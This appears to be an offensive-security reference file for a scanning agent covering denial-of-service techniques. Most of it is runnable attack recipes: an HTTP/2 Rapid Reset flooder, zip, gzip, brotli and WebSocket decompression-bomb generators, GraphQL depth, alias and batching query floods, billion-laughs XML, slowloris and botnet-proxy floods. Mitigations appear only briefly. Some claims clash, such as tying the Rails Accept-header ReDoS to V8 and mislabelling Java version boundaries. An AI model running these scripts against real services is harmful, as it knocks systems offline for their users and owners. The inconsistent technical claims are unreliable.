---
name: dos-resource-exhaustion-advanced-deep
description: DoS advanced depth — ReDoS per-engine (PCRE/Python-re/Java-Pattern/V8-irregexp/RE2), hash flooding per-language, decompression-bomb per-format recipes, GraphQL depth/alias/batching/fragment attack chains, HTTP/2 Rapid Reset / CONTINUATION flood, XML quadratic + billion-laughs, parser polynomial complexity classes, and operational pipeline attacks
sibling: dos_resource_exhaustion
load_when: scan_mode == "deep"
---

# DoS and Resource Exhaustion — Advanced + Expert Depth

This is the advanced+expert deep sibling to `dos_resource_exhaustion.md`. The base owns the attack-surface framing, primitive catalog, decompression ratio table, and GraphQL primitive introduction. This file owns the full established technique surface at depth: ReDoS per regex engine with pattern catalog, hash-flooding per language, decompression-bomb per format with crafted-input recipes, GraphQL attack-chain depth, HTTP/2 protocol attacks, XML parser quadratic/exponential primitives, and operational-pipeline DoS beyond simple resource consumption. The novel sibling owns the 2024-2026 CVE catalog.

Load this file when the goal is reasoning about which regex engine is in play, crafting a specific decompression bomb for a format, choosing between GraphQL depth and alias attacks, or exploiting HTTP/2 protocol state.

## ReDoS — Per-Engine Deep Treatment

### PCRE / PCRE2 (PHP preg_match, Nginx, Apache mod_rewrite)

**Primitive.** Backtracking NFA. Vulnerable to nested quantifiers, overlapping alternatives, and un-anchored repetitions.

**All-of preconditions:**
1. PCRE-backed regex sink reachable with attacker input.
2. Pattern contains one of: `(a+)+`, `(a*)*`, `(a|a)*`, `.*a.*b.*c` where N classes overlap.
3. No `pcre.backtrack_limit` configured (or value too high).

**Vulnerable patterns catalog (PCRE):**
| Pattern | Shape | Attack input |
|---|---|---|
| `(a+)+$` | nested quantifier + anchor | `a`×N + `X` |
| `(a|a)*` | branching alternatives | `a`×N + `X` |
| `([a-z]+)+@` | email-shaped | `a`×N + `!` |
| `(.*)*$` | wildcard greedy | arbitrary + `\n`? |
| `(0*(?:1[0-9]|2[0-4][0-9]|25[0-5]))*` | IP-shaped | `0`×N + `.` |
| `^(([^"]*)*)*"$` | quote-escape parser | `"`-less string + `X` |

**Attack recipe (full with timing):**
```python
import re, time
# Vulnerable pattern — found in production email validator
pattern = re.compile(r'^(([a-zA-Z0-9])+@)+(.*)$')

# Benign input matches quickly
t0 = time.perf_counter()
pattern.match('user@example.com')
print(f"Benign: {time.perf_counter() - t0:.6f}s")

# Attack: trigger backtracking with partial-match + no-match suffix
for n in range(10, 35):
    attack = 'a' * n + '!'
    t0 = time.perf_counter()
    try:
        pattern.match(attack)
    except Exception:
        pass
    elapsed = time.perf_counter() - t0
    print(f"n={n}: {elapsed:.3f}s")
# Doubling per char: n=20 → ms, n=30 → seconds, n=35 → minutes
```

**Alternate recipe — polynomial backtracking (quadratic):**
```python
# Pattern vulnerable to quadratic backtracking (less dramatic than exponential)
pattern = re.compile(r'^\s*([^\s]+)\s*$')
# Trigger: whitespace-dense input
attack = ' ' * 50000 + '\t' + ' ' * 50000
# Takes seconds vs milliseconds for benign input
```

**Mitigation shape.**
- PCRE 10.21+ added `(*LIMIT_MATCH=N)` and `pcre2_set_match_limit` to bound work.
- Switch to `PCRE2_ENDANCHORED` or atomic groups `(?>...)`.
- Replace backtracking regex with RE2 (automaton-based, no backtracking).

**Confirmation signals (PCRE ReDoS):**
1. **Response time increases exponentially per input character** — 2x per added char at the attack-input length tipping point.
2. **Server-side CPU trace shows single-request >1 second** per request.
3. **PCRE match-limit log** — PCRE2 with limits enabled logs match-limit exceeded.
4. **504 Gateway Timeout** or request-timeout kills — downstream signal.
5. **Concurrent attack blocks all workers** — fire 10 requests concurrently; service becomes unresponsive.

### Python `re` / Java `java.util.regex.Pattern`

**Primitive.** Same NFA backtracking family. Java's `Pattern` further has `Pattern.MULTILINE` quirks.

**Attack recipe:**
```python
import re, time
# Pattern reaching the vulnerable sink
pat = re.compile(r'^(a+)+$')
# Trigger
for n in range(20, 35):
    t0 = time.perf_counter()
    pat.match('a' * n + 'X')
    print(f"n={n}: {time.perf_counter()-t0:.3f}s")
# Doubling per character: n=20 → ms, n=30 → seconds, n=35 → minutes
```

### V8 irregexp (Node, Chrome)

**Primitive.** V8 uses irregexp — a hybrid NFA/DFA. Some patterns execute as DFA (safe), some fall back to NFA (vulnerable). V8 occasionally promotes/demotes patterns based on heuristics.

**Observed vulnerability (CVE-2024-26142 Rails ActionDispatch):** V8 irregexp was still vulnerable to the Rails Accept-header parser's regex, confirming the hybrid is NOT universally safe.

**Preconditions.** Node.js application + regex sink + user-reachable input.

**Attack recipe (V8 irregexp fallback-to-NFA):**
```javascript
// V8 falls back to NFA on patterns with:
// - Backreferences
// - Lookbehind/lookahead with repetition
// - Unicode-mode patterns with specific class combinations
const pattern = /^(([a-zA-Z0-9])+@)+(.*)$/;

// Trigger
let n = 25;
const attack = 'a'.repeat(n) + '!';
console.time('match');
pattern.exec(attack);  // seconds on NFA fallback
console.timeEnd('match');
```

**V8-specific NFA-fallback triggers** (as of V8 11.x):
- Pattern uses `\k<name>` or `\1` backreferences.
- Pattern uses conditional group `(?(DEFINE)...)`.
- Pattern uses lookbehind with quantifiers.
- V8 heuristic switch for complex alternations.

**Mitigation.** V8 doesn't offer runtime regex timeout; mitigation is pattern-review (replace with Rust-ported RE2 via `re2` npm package).

### Go `regexp` / Rust `regex`

**Primitive.** RE2-based (automaton). Linear time. **Not vulnerable to catastrophic backtracking.**

**Pathology they don't cover.** Backreferences and lookaround are unsupported (deliberately, to maintain linear-time guarantee). Applications requiring backreferences fall back to third-party packages, which may be backtracking-based.

### Ruby pre-3.2 vs 3.2+

**Pre-3.2:** NFA backtracking. CVE-2024-49761 (REXML) is a late-era pre-fix.

**3.2+:** adds `Regexp.timeout` and partial automaton optimization. Not a full fix — some patterns still backtrack but with configurable timeout.

### ReDoS Pattern Catalog

Common vulnerable patterns found in the wild:
```
(.+)*                           # Classic
(a|a)*                          # Branching
(.*)*$                          # Wildcard greedy
([a-zA-Z]+)*                    # Character class greedy repeat
([^"]*)*                        # Negated class greedy repeat (SQL quote parser)
^(\w+)(.*)@([a-z\.]+)\.([a-z]+)$ # Email-shaped
(http|https)+://(.*)+           # URL-shaped
^(0*(?:1[0-9]|2[0-4][0-9]|25[0-5]))*$   # IP-shaped
```

Each matches a legitimate input but trips on near-match adversarial input.

## Hash Flooding — Per-Language State Recovery

### CPython pre-3.4 vs 3.4+

**Pre-3.4:** `hash(str)` was deterministic based on string content. Attacker crafted N strings with identical hash (collision-finding via trivial algebra over Python's hash function). Hashtable degraded to O(N²).

**3.4+:** `PYTHONHASHSEED` randomizes per-process-start. Attacker must recover the seed first.

**Seed recovery:** per-process-start timing side-channel. In a long-running Python process, observe hash-sensitive operations to recover seed; then craft collisions.

**Full attack recipe (CPython pre-3.4 or seed-known 3.4+):**
```python
# Reversing CPython's old FNV-based hash:
# hash("x") = x_bytes[0] * seed + x_bytes[1] * seed + ... (modular)
# Given seed, collision-finding is linear algebra

# Simplified: for a known seed, construct N strings with hash = 0
def build_collisions(seed, target_hash=0, count=10000):
    collisions = []
    # Each string ends in a different char but hashes to target
    base = b'collision_prefix_'
    for i in range(count):
        # Compute suffix that makes hash(base+suffix) == target_hash
        suffix = find_suffix_with_hash(base, target_hash, i, seed)
        collisions.append(base + suffix)
    return collisions

# Submit as dict keys or map keys to a long-lived data structure
# Observe quadratic degradation
```

**Impact per language:**

| Language | Pre-fix hash | Mitigation shipped |
|---|---|---|
| CPython | FNV-based deterministic | SipHash + per-process seed in 3.4 |
| PHP | zend_inline_hash_func deterministic | Randomized seed in 7.1 |
| Java HashMap | `s[0]*31^(n-1) + s[1]*31^(n-2) + ...` (public, reversible) | Tree-node fallback in Java 8 (O(log N) worst case); not seed-random |
| Ruby | Random seed since 1.9 | Mitigated |
| Node (V8) | Random seed | Mitigated |
| Go | Random seed since Go 1.0 | Mitigated |

### PHP pre-7.1 vs 7.1+

**Pre-7.1:** `zend_inline_hash_func` deterministic.
**7.1+:** Randomized seed.

### Java pre-15 vs 15+

**Pre-15:** `String.hashCode()` is deterministic — the formula `s[0]*31^(n-1) + s[1]*31^(n-2) + ...` is public and reversible. HashMap collisions trivially craftable.
**15+:** `HashMap` since Java 8 uses tree-nodes (red-black trees) in buckets with ≥8 entries, degrading to O(log N) worst case. Hash flooding mitigated structurally, not via seed.

### Node (V8)

V8 uses a randomized hash seed; mitigated.

### Attack Recipe (CPython 3.3 or seed-recovered 3.4+)

```python
# Build N strings all hashing to 0
collisions = []
for i in range(10000):
    # Specific collision construction depends on hash impl
    s = construct_collision_string(seed=observed_seed, target_hash=0, iteration=i)
    collisions.append(s)
# Submit to any application that stores collisions as dict/map keys
```

## Decompression Bombs — Per-Format Recipes

### Zip Bomb — Classic 42.zip

**Structure.** 16 nested zip files, each containing 10 copies of a 4.3 GB zero-filled file. Each level multiplies 10x. Total: 10^16 × 4.3GB ≈ 4.5PB.

**Full generation recipe:**
```python
import zipfile, io, os

def generate_nested_zipbomb(output_path, levels=16, children_per_level=10):
    # Create innermost zero-filled file
    inner = b'0' * (4 * 1024 * 1024 * 1024)  # 4GB zeros
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as z:
        z.writestr('inner.txt', inner)
    current = buf.getvalue()

    for level in range(levels):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as z:
            for i in range(children_per_level):
                z.writestr(f'child_{i}.zip', current)
        current = buf.getvalue()

    with open(output_path, 'wb') as f:
        f.write(current)
```

**Modern variant — non-recursive overlapping zip bombs.** David Fifield's technique (2019) — 46KB file, 4.5PB uncompressed, achieved via overlapping file headers rather than nesting:

```python
# zbsh.py / Fifield's zblg generator — one-level zip with headers
# that point to overlapping data regions
# Each listed "file" references the same compressed stream multiple times
# Decompression returns 4.5PB from a 46KB zip
```

**Scanner-aware zip bombs.** Classic 42.zip is detectable by nesting-depth scanners. Fifield's non-recursive variant bypasses nesting-depth scanners because it's one zip file with many entries. Modern anti-bomb libraries check decompressed size per-entry, not nesting depth.

### Gzip Bomb

**Structure.** `gzip -9` on a 1GB zero-filled file produces ~1MB output. Chain multiple gzip layers for higher ratio.

**All-of preconditions:**
1. Server accepts `Content-Encoding: gzip` on request body.
2. Server decompresses without `maxDecompressedSize` enforcement.
3. Attacker reaches the content-accepting endpoint.

**Full attack recipe (CVE-2026-5438 Orthanc class):**
```bash
# Create ~1MB gzip that expands to 1GB
dd if=/dev/zero bs=1M count=1024 | gzip -9 > bomb.gz
ls -la bomb.gz  # ~1MB
gzip -l bomb.gz  # confirm compressed/uncompressed sizes

# Nested gzip bomb — further ratio
gzip -c -9 bomb.gz > bomb.gz.gz
# Server with gzip decoding may unwrap one layer; if it unwraps all layers (Content-Encoding chain)
# the ratio multiplies

# Submit
curl -X POST \
    -H "Content-Encoding: gzip" \
    -H "Content-Type: application/dicom" \
    --data-binary @bomb.gz \
    https://orthanc.target/instances
```

**Confirmation signals.**
1. **Server 503 / connection reset after decompression started.**
2. **Memory monitoring shows GB-level growth.**
3. **Server-side logs: `OutOfMemoryError` or process restart.**

### Brotli Bomb

**Structure.** Brotli compression is similar to gzip but with higher ratios on specific input shapes. Scrapy CVE-2025-6176 class.

**Full attack recipe:**
```python
import brotli
# Brotli at level 11 (highest) on highly-redundant input
data = b'\0' * (1024 * 1024 * 1024)  # 1GB zeros
bomb = brotli.compress(data, quality=11, lgwin=24)
# bomb is ~1KB → 1GB on decompression

# Submit as HTTP response (Scrapy class) or request body
# Scrapy's brotli handling pre-fix did not enforce size cap
```

**Attack variant — brotli dict streaming.** Brotli supports shared dictionaries; attacker-controlled dictionary with a repeating pattern enables higher ratios than base-11 compression.

### XML Billion Laughs

**Structure.** Recursive entity expansion.
```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!-- ... -->
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```
A 1KB XML expands to 10^9 characters (1GB) on parse. Primary owner: `xxe.md § Core Payloads`.

### XML Quadratic Blowup (Expat CVE-2026-66046)

```xml
<a a1="val" a2="val" a3="val" ... aN="val"/>
```
Expat's `storeAtts` scans the attribute list per attribute → O(N²). An input with 10000 attributes forces 10^8 ops.

### SVG Dimension Attack

```xml
<svg width="100000" height="100000">...</svg>
```
Rasterization allocates 10^10 pixels × 4 bytes = 40GB bitmap.

### PNG IDAT / FITS

Pillow CVE-2026-40192: FITS image format wraps GZIP; attacker nests GZIP for high ratio within an image.

### WebSocket permessage-deflate (undici / Netty)

**Primitive.** WebSocket RFC 7692 permessage-deflate extension compresses messages per-frame. Attacker sends highly-compressed frame; server decompresses without size cap.

**All-of preconditions:**
1. WebSocket endpoint accepts permessage-deflate extension.
2. Server library (undici, Netty, ws, websockets-py) pre-fix version.
3. No `maxDecompressedSize` or `maxReadLimit` configured.

**Full attack recipe:**
```javascript
import WebSocket from 'ws';
import zlib from 'zlib';

const ws = new WebSocket('wss://target.net', {
    perMessageDeflate: { threshold: 0 }  // enable extension
});

ws.on('open', () => {
    // Create highly-compressed payload
    const data = Buffer.alloc(1024 * 1024 * 1024, 0);  // 1GB zeros
    const compressed = zlib.deflateRawSync(data, { level: 9 });
    // compressed is ~1KB; server decompresses to 1GB on receive

    // Send as single compressed frame
    ws.send(compressed, { compress: false });  // we pre-compressed
});
```

**Netty-specific trigger (CVE-2026-42587):**
```java
// Netty HttpContentDecompressor accepts maxAllocation=Integer.MAX_VALUE by default
// Attacker-controlled permessage-deflate frame allocates GB-scale ByteBuf
// OOM-kill on process
```

**Confirmation signals (permessage-deflate):**
1. **Server OOM-kill observable** via process restart.
2. **Memory monitoring GB-level growth** per frame.
3. **Netty: `OutOfMemoryError: Direct buffer memory`** in logs.
4. **Service unavailable for other WebSocket clients** post-attack.

## GraphQL Attack-Chain Depth

### Depth Attack — Full Protocol

**Primitive.** Nested fields walk the schema recursively. If server does not cap depth, N levels force N layers of resolver execution.

**All-of preconditions:**
1. GraphQL endpoint reachable.
2. Schema has recursive relationships (user → friends → user → ...).
3. No `maxQueryDepth` / `maxQueryComplexity` configured OR limit is too permissive.
4. Resolver per level does non-trivial work (database query, remote call).

**Full attack recipe (query generator):**
```python
import requests

def generate_depth_query(depth):
    inner = "{ id name }"
    for _ in range(depth):
        inner = f"friends {{ ...on User {inner} }}"
    return f"{{ user(id: \"1\") {{ {inner} }} }}"

# Fire increasing depths; measure response time
for d in [10, 15, 20, 25, 30, 35]:
    query = generate_depth_query(d)
    t0 = time.perf_counter()
    r = requests.post('https://target/graphql',
                      json={'query': query},
                      timeout=60)
    print(f"depth={d}: {time.perf_counter()-t0:.2f}s status={r.status_code}")
# If no cap: time grows exponentially with depth
# If capped: 400 Bad Request at the cap
```

**Confirmation signals (GraphQL depth):**
1. **Response time grows with depth.** 2x per added level on resolver-chain.
2. **Error at specific depth** — `maxQueryDepth exceeded` message confirms the cap value.
3. **Backend subgraph timeout** — federation deployments show subgraph response-time header exceeded.
4. **Database connection pool exhaustion** — concurrent attack reaches DB pool limit.

**Mitigation shape.** Set `maxQueryDepth: 15` in Apollo Server; use `graphql-depth-limit` package.

### Alias Attack — Resource Multiplication

**Primitive.** GraphQL field aliasing lets one query invoke the same resolver N times with different output names.

**All-of preconditions:**
1. GraphQL endpoint allowing arbitrary aliases.
2. Target field has non-trivial resolver cost (DB query, remote call, computation).
3. No per-alias rate-limiting.

**Full attack recipe:**
```python
import requests

def build_alias_query(field_name, count):
    aliases = ',\n'.join([f'  a{i}: {field_name}' for i in range(count)])
    return "{\n" + aliases + "\n}"

for n in [100, 1000, 10000]:
    query = build_alias_query('expensiveField(x: 1)', n)
    t0 = time.perf_counter()
    r = requests.post('https://target/graphql',
                      json={'query': query}, timeout=120)
    print(f"n={n}: {time.perf_counter()-t0:.2f}s, size={len(r.content)}")
# Response size grows ~N; server CPU grows ~N × field cost
```

**Confirmation signals (alias attack):**
1. **Response time scales linearly with alias count.**
2. **Response body size scales linearly** (unique keys per alias).
3. **Database query log shows N × field-resolver queries** per attack request.
4. **Server returns `maxAliasCount` error** if cap configured.

### Batching Attack

**Primitive.** GraphQL batching endpoints accept arrays of queries. Each request processes N queries sequentially or in parallel.

**All-of preconditions:**
1. Endpoint accepts batched request `[{query}, {query}, ...]`.
2. No `maxBatchSize` cap or cap too permissive.

**Full attack recipe:**
```python
batch = [
    {"query": "{ expensiveField }"}
    for _ in range(10000)
]
r = requests.post('https://target/graphql', json=batch, timeout=600)
# Server processes 10000 queries in one HTTP request
# Each sequentially or in-parallel; subgraph fetches multiply
```

**Confirmation.** Response is a JSON array of 10000 results; server CPU/memory consumed proportionally.

### Fragment-Unification Attack

**Primitive.** apollo-compiler (CVE-2025-31496) + absinthe-graphql (CVE-2026-43967) — fragment-name resolution during query compilation has quadratic / exponential complexity in fragment count.

**Full attack recipe:**
```python
def build_fragment_chain(n):
    fragments = []
    for i in range(1, n):
        fragments.append(f"fragment F{i} on Query {{ ...F{i+1} }}")
    fragments.append(f"fragment F{n} on Query {{ heavyField }}")
    return "\n".join(fragments) + "\n{ ...F1 }"

query = build_fragment_chain(100)
# Compiler walks fragment definitions pairwise during unification
# O(N²) in fragment count; 100 fragments → 10000 compiler ops
r = requests.post('https://target/graphql',
                  json={'query': query}, timeout=120)
```

**Observed on unpatched Apollo (see CVE-2025-31496 version table in novel sibling).** 100 fragments → multi-second compilation; 1000 → minute-scale.

### Field-Duplication Attack (CVE-2024-39895 Directus Class)

**Primitive.** Within a single query, duplicate expensive fields N times.

**Full attack recipe:**
```graphql
# 1000 duplicates of 'id'
{
  user {
    id id id id id id id id id id ...  # 1000 duplicates
  }
}
```

Even for in-memory resolution, Directus resolved `id` 1000 times — the resolver per-field has overhead (field-level authz check, serialization) that multiplies.

### Combined Attack Shapes

Combine depth + alias + batching for multiplicative impact:
```python
# 100 aliases × depth-10 × batched-100 = 100,000 resolver calls per batch request
# Many frameworks have per-dimension limits but no combined-cost limit
batch = []
for _ in range(100):
    query = "{\n"
    for i in range(100):
        inner = "{ id }"
        for _ in range(10):
            inner = f"{{ friends {inner} }}"
        query += f"  a{i}: user(id: 1) {inner}\n"
    query += "}"
    batch.append({'query': query})
r = requests.post('https://target/graphql', json=batch)
```

## HTTP/2 Rapid Reset (CVE-2023-44487) and CONTINUATION Flood

### Rapid Reset (CVE-2023-44487)

**Primitive.** HTTP/2 lets a client send HEADERS to open a stream, then immediately RST_STREAM to cancel. The server allocates state for the stream (parse, routing, resolver init), then tears it down. Cost on attacker: ~tiny. Cost on server: real resources.

**All-of preconditions:**
1. HTTP/2 server reachable (nginx, Apache, Go net/http, Java servlet with HTTP/2, Node http2).
2. Pre-fix version (patches issued Oct 2023 across most servers).
3. Server MAX_CONCURRENT_STREAMS allows meaningful burst.

**Full attack recipe (Python with hyper-h2):**
```python
import h2.connection
import h2.config
import ssl, socket

def rapid_reset_attack(host, port, concurrent_streams=100, iterations=10000):
    ctx = ssl.create_default_context()
    ctx.set_alpn_protocols(['h2'])
    sock = socket.create_connection((host, port))
    sock = ctx.wrap_socket(sock, server_hostname=host)
    conn = h2.connection.H2Connection(config=h2.config.H2Configuration(client_side=True))
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())

    stream_id = 1
    for _ in range(iterations):
        for _ in range(concurrent_streams):
            # Send HEADERS to open stream
            conn.send_headers(stream_id, [
                (':method', 'GET'),
                (':scheme', 'https'),
                (':authority', host),
                (':path', '/'),
            ])
            # Immediately reset the stream
            conn.reset_stream(stream_id)
            stream_id += 2
        sock.sendall(conn.data_to_send())

rapid_reset_attack('target.net', 443)
```

**Attack cost.** Attacker CPU: trivial — generating HEADERS + RST_STREAM pairs is cheap. Attacker bandwidth: thousands of streams per second over one TCP connection. Server cost: full-stream state allocation per request.

**Confirmation signals (Rapid Reset):**
1. **Server CPU spike on H2 connection** — observable via `top` / Prometheus during attack.
2. **Server returns `GOAWAY` frame** — H2 flow-control engaged (server tries to defend).
3. **Service degradation for other clients** — 503 or increased latency.
4. **nginx error log: `http2 connection flooded with resets`** or similar vendor-specific log.

**Mitigation shape.** Apache httpd `H2WindowSize`; nginx `http2_max_requests`, `http2_max_concurrent_streams`; Go `http2.Server.MaxConcurrentStreams`. All added RST-flood detection in Oct 2023 patches.

### CONTINUATION Flood (CVE-2024-27316 class)

**Primitive.** HTTP/2 HEADERS frame can be followed by CONTINUATION frames. Attacker sends HEADERS + many CONTINUATION frames with uncompressed names/values; server allocates memory for growing header table before processing.

**Attack recipe:**
```python
# Send HEADERS with END_HEADERS=0, then unlimited CONTINUATION frames
# Each CONTINUATION carries one more big header
# Server buffers all headers before processing
for _ in range(100000):
    conn.send_continuation(stream_id, [
        ('x-garbage-header-' + str(i), 'A' * 1000)
        for i in range(100)
    ])
```

**Vulnerable servers (per CVE-2024-27316 et al):** unpatched Apache httpd, nginx, Go HTTP/2 — see version boundaries in novel sibling. Patches cap total header-list size.

### Priority Flood

**Primitive.** HTTP/2 PRIORITY frames adjust stream priority tree. Flood of priority updates forces priority-tree recomputation.

**Attack recipe:**
```python
for _ in range(1000000):
    conn.send_priority(stream_id,
                       weight=random.randint(1, 256),
                       depends_on=random.randint(1, 1000),
                       exclusive=random.choice([True, False]))
```

Priority-flood mitigation: HTTP/2 RFC 9113 (2022) removed priority frames entirely; HTTP/2 implementations post-2022 ignore them.

## XML Parser Attacks Beyond Billion Laughs

### Namespace Attribute Quadratic

**Primitive.** XML namespace declarations are resolved per-element. An element with N namespace declarations forces O(N) resolution per attribute reference; nested with M attributes becomes O(N × M) per element, O(N × M × elements) overall.

**Attack recipe:**
```xml
<root xmlns:a1="url" xmlns:a2="url" xmlns:a3="url" ... xmlns:a10000="url">
  <a1:tag>
    <a2:child a1:attr1="x" a2:attr2="x" ... a1000:attr1000="x"/>
  </a1:tag>
</root>
```
Namespace-prefix resolution per element → O(N²) per element with N namespace declarations. 10,000 namespaces + 1,000 references per element = 10^7 lookups per element.

### XInclude Chain

```xml
<r xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file1.xml"/>
</r>
<!-- file1.xml -->
<data xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file2.xml"/>
</data>
<!-- Nested N levels -->
```

### XSLT Transform Loop

See `xslt_injection.md`. XSLT `<xsl:apply-templates>` on recursive templates without base case.

## Operational-Pipeline DoS

Beyond CPU/memory, resource exhaustion extends to pipeline-state. Each class has distinct attack recipes.

### Lock Exhaustion

**Primitive.** Attacker holds a global application lock (file lock, DB row lock) → other requests block.

**Recipe:**
```python
# Example: application has a single global file-lock around /tmp/export.lock
# Attacker triggers export, holds the request open indefinitely (slowloris-style)
import requests
r = requests.get('https://target/admin/export/trigger', stream=True, timeout=None)
# Keep connection open; the lock is held while handler runs
# Other export requests queue; after N queued, service degrades
```

### Connection-Pool Exhaustion

**Primitive.** Open N long-lived connections to the application; the connection pool starves.

**Recipe:**
```python
import socket
sockets = []
for i in range(10000):
    s = socket.create_connection(('target.net', 443))
    sockets.append(s)
    # Hold without sending data (slowloris pattern)
# Server with max_connections=1000 cannot accept new clients
```

### Worker-Pool Exhaustion

**Primitive.** Fill the thread/process pool with slow-handler requests; new requests queue.

**Recipe:**
```python
import threading
def slow_request():
    requests.post('https://target/upload-and-process',
                  data=generate_slow_payload(),
                  timeout=600)
# Spawn N threads
threads = [threading.Thread(target=slow_request) for _ in range(N)]
for t in threads: t.start()
# Server with WORKERS=100 queues after 100 concurrent slow requests
```

### Queue Amplification

**Primitive.** Submit N tasks to an async queue; downstream consumers can't keep up.

**Recipe:**
```python
# Celery / Sidekiq / Bull queue — attacker submits N jobs
# Each job is heavy (OCR, image processing, ML inference)
# Queue depth grows; consumer workers can't drain
for i in range(100000):
    requests.post('https://target/submit-ocr-job',
                  files={'image': ('x.jpg', b'JFIF...')})
```

### DNS Cache Pollution via Resolution Flood

**Primitive.** Trigger application to resolve attacker-controlled hostnames; application cache fills with attacker entries.

**Recipe:**
```python
for i in range(1000000):
    hostname = f'{i}-{random.randint(0, 2**32)}.attacker.net'
    # Trigger application-level DNS resolution
    requests.get(f'https://target/preview?url=https://{hostname}/')
# Attacker DNS server returns different IPs per query
# Target's local DNS cache fills with attacker entries
```

### LRU Cache Fill DoS

**Primitive.** Submit unique keys to a cache with eviction policy LRU; cache evicts legitimate content.

**Recipe:**
```python
# Application has a response cache keyed by request parameters
# Attacker submits unique param values to flood the cache
for i in range(1000000):
    requests.get(f'https://target/product?q=unique-{i}-{random.random()}')
# Cache fills; legitimate product-page requests become cache misses
```

### Rate-Limiter DoS

**Primitive.** Fire from distributed IPs; rate-limiter itself consumes resources tracking state.

**Recipe:**
```python
# Each unique IP is a rate-limit-state entry in the limiter's store
# Flood from distributed proxies (botnet, residential proxies)
# Rate-limiter's internal state (Redis / in-memory map) grows
for proxy_ip in botnet_ips:
    requests.get('https://target/api/anything',
                 proxies={'https': f'http://{proxy_ip}:8080'})
```

## Composite Chains

- *ReDoS → middleware stall → cascading failure.* Rails Accept-header CVE-2024-26142 — one slow regex blocks all requests on that worker.
- *Decompression bomb → OOM-kill → session loss across cluster.* Any session not persisted outside the process is lost.
- *GraphQL depth → database query cascade → DB connection pool exhaustion → full service outage.*
- *HTTP/2 Rapid Reset → trivial-cost DDoS at line rate.*
- *Hash flood → long-lived in-memory map degraded → every subsequent request slow.*
- *Permessage-deflate bomb → WebSocket worker OOM → WebSocket subsystem down → chat/notification unavailable.*

## Advanced Testing Methodology

1. **Fingerprint regex engine.** PCRE vs Python `re` vs V8 vs RE2. The engine determines vulnerability.
2. **Grep patterns against the pattern catalog.** Nested quantifiers, overlapping alternatives, email-shaped regex are the archetypes.
3. **Fuzz with length-doubling payloads.** `a × 10, 20, 30, ...` + non-match suffix. Measure time per length.
4. **Enumerate decompression paths.** Content-Encoding accepting, zip/image uploads, WebSocket deflate.
5. **For GraphQL, probe depth/alias/batching/fragment in order.** Each primitive is a separate finding.
6. **Observe server-side resource at probe time.** CPU utilization, memory, connection count.

## Advanced Validation

- **ReDoS claim requires time differential >10x against baseline.** Smaller differentials are inconclusive.
- **Decompression-bomb claim requires 503 / OOM / timeout observable.**
- **GraphQL claim requires reproducible resource consumption.**
- **Hash-flooding claim requires framework version in pre-fix range.** Modern frameworks are mitigated.
- **HTTP/2 Rapid Reset claim requires observed thousand-plus streams.** Single-stream RST is normal client behavior.

## Pro Tips

- **The regex pattern itself is often not the bug — the attacker-controlled input is.** A benign regex becomes DoS on adversarial input.
- **Decompression ratios in reality are higher than most devs think.** Any production code that decompresses user input without a limit is a candidate finding.
- **GraphQL depth-limiting is not alias-limiting.** Both must be configured.
- **HTTP/2 Rapid Reset is universally applicable to any H2 server.** CDN/WAF mitigation is the typical defense.
- **Hash flooding is per-process-start-state on modern languages.** Attacker needs to observe before weaponizing — long-lived processes are more susceptible.

## Tooling

- **recheck, safe-regex-rs** — static ReDoS detectors.
- **42.zip, zbsh.py** — zip bomb generators.
- **gzipbomb, undici-permessage-deflate-poc** — gzip/websocket bombs.
- **InQL Scanner** — GraphQL vulnerability scanning.
- **h2load, httpflood** — HTTP/2 testing including Rapid Reset.
- **ab, wrk, vegeta** — generic load generators useful for operational-pipeline DoS.

## Summary

The DoS advanced tier is the full established technique surface at depth: ReDoS per engine (PCRE / Python-re / Java-Pattern / V8-irregexp / RE2-safe) with pattern catalog; hash-flooding per language (CPython / PHP / Java pre-fix); decompression bombs per format (zip classic + non-recursive, gzip, brotli, XML billion-laughs, XML quadratic, SVG dimension, PNG IDAT, FITS GZIP, WebSocket permessage-deflate); GraphQL attack-chain depth across depth/alias/batching/fragment-unification/field-duplication/combined-shape; HTTP/2 protocol attacks (Rapid Reset CVE-2023-44487, CONTINUATION flood, Priority flood); XML parser attacks beyond billion laughs (namespace quadratic, XInclude chain, XSLT loops); operational-pipeline DoS (locks, pools, queues, DNS cache, LRU cache fill, rate-limiter DoS). Each CVE in `dos_resource_exhaustion_novel_deep.md` reduces to one of these primitives.
